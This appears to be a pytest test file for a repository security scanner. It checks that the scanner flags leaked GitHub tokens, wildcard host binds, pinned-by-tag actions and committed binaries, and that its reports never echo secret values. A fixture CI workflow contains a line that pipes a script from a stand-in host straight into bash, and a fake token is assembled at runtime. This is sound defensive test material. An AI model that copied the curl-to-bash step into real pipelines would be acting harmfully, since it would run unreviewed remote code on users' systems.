import json
import subprocess

import pytest

from scripts.repo_reality_check import check, main, to_markdown

FAKE_TOKEN = "ghp_" + "A" * 36   # built at runtime so no credential-shaped literal sits in this file


def git(repo, *args):
    subprocess.run(["git", "-C", str(repo), *args], check=True, capture_output=True)


@pytest.fixture
def repo(tmp_path):
    r = tmp_path / "customer"
    (r / ".github" / "workflows").mkdir(parents=True)
    (r / ".github" / "workflows" / "ci.yml").write_text(
        "on: push\njobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n"
        "      - uses: actions/checkout@v4\n      - run: curl -s https://x.example/i.sh | bash\n")
    (r / "app.py").write_text('app.run(host="0.0.0.0")\n')
    (r / "config.py").write_text(f'TOKEN = "{FAKE_TOKEN}"\n')
    (r / ".env").write_text("SECRET=1\n")
    (r / "sessions").mkdir()
    (r / "sessions" / "s1.jsonl").write_text("{}\n")
    (r / "tool.exe").write_bytes(b"MZ" + b"\0" * 100)
    git(r, "init", "-q")
    git(r, "add", "-A")
    return r


def test_finds_each_area_without_leaking_secret_values(repo):
    result = check(repo)
    rules = {f["rule"] for f in result["findings"]}
    assert {"github_token", "WILDCARD_BIND", "curl_pipe_shell", "action_pinned_by_tag",
            "generated_or_private_file_tracked", "binary_committed", "permissions", "no_lockfile"} <= rules
    report = json.dumps(result) + to_markdown(result)
    assert FAKE_TOKEN not in report and "SECRET=1" not in report


def test_obvious_test_fixtures_are_low_not_hidden(tmp_path):
    r = tmp_path / "fx"
    (r / "tests").mkdir(parents=True)
    (r / "tests" / "test_redact.py").write_text('TOKEN = "ghp_' + "1234567890" * 3 + '6789"\n')
    git(r, "init", "-q")
    git(r, "add", "-A")
    found = [f for f in check(r)["findings"] if f["area"] == "secrets"]
    assert [f["severity"] for f in found] == ["low"]


def test_clean_repo_has_no_high_findings(tmp_path):
    r = tmp_path / "clean"
    r.mkdir()
    (r / "app.py").write_text('app.run(host="127.0.0.1")\n')
    (r / "uv.lock").write_text("# lock\n")
    git(r, "init", "-q")
    git(r, "add", "-A")
    assert check(r)["summary"]["high"] == 0


def test_cli_writes_json_and_markdown(repo, tmp_path):
    out = tmp_path / "out"
    assert main([str(repo), str(out)]) == 0
    assert json.loads((out / "report.json").read_text())["findings"]
    assert (out / "report.md").read_text().startswith("# Repo Reality Check")


def test_report_names_the_checked_commit(repo):
    git(repo, "-c", "user.email=t@example.invalid", "-c", "user.name=t", "commit", "-qm", "init")
    result = check(repo)
    assert len(result["sha"]) == 40 and result["sha"] in to_markdown(result)


def test_second_pass_blocks_a_leaking_report(repo, tmp_path, monkeypatch):
    import scripts.repo_reality_check as rrc
    real = rrc.check

    def leaky(path):
        result = real(path)
        result["findings"][0]["detail"] = f"oops {FAKE_TOKEN} owner@example.org"
        return result

    monkeypatch.setattr(rrc, "check", leaky)
    out = tmp_path / "out"
    assert rrc.main([str(repo), str(out)]) == 3
    assert not out.exists()
    assert rrc.leak_check(f"x {FAKE_TOKEN} owner@example.org") == ["github_token", "email_address"]


def test_report_answers_first_questions_and_states_limits(repo):
    md = to_markdown(check(repo))
    assert "## What the findings mean and how to fix them" in md
    assert "**`curl_pipe_shell`**" in md and "**Fix:**" in md and "**Effort:**" in md
    assert "## What this check did NOT cover" in md and "not 'secure'" in md


def test_digest_verifies_same_commit_and_rejects_tampering(repo, tmp_path):
    git(repo, "-c", "user.email=t@example.invalid", "-c", "user.name=t", "commit", "-qm", "init")
    out = tmp_path / "out"
    assert main([str(repo), str(out)]) == 0
    assert main(["--verify", str(out / "report.json"), str(repo)]) == 0
    report = json.loads((out / "report.json").read_text())
    report["findings"] = report["findings"][1:]                     # someone hides a finding
    (out / "report.json").write_text(json.dumps(report))
    assert main(["--verify", str(out / "report.json"), str(repo)]) == 1
